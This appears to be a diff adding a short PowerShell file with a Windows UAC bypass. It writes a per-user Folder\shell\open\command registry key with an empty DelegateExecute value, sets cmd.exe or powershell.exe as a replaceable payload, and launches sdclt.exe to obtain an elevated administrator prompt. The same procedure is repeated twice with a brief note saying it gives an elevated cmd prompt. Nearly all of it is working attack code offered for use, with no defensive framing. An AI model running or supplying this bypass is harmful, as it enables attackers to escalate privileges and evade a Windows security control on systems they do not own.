@@ -1,0 +1,29 @@
+# Step 1: Create the registry key
+New-Item -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Force
+
+# Step 2: Add DelegateExecute to avoid UAC prompt
+New-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -PropertyType String -Force
+
+# Step 3: Set your payload
+Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value "cmd.exe"  # Replace with your custom EXE or PowerShell payload
+
+# Step 4: Launch sdclt.exe
+Start-Process "C:\Windows\System32\sdclt.exe"
+
+
+
+Gives elvated(admin) cmd prompt 
+uses - sdclt.exe
+
+
+# Step 1: Create the registry key
+New-Item -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Force
+
+# Step 2: Add DelegateExecute to avoid UAC prompt
+New-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -PropertyType String -Force
+
+# Step 3: Set your payload
+Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value "powershell.exe"  # Replace with your custom EXE or PowerShell payload
+
+# Step 4: Launch sdclt.exe
+Start-Process "C:\Windows\System32\sdclt.exe"
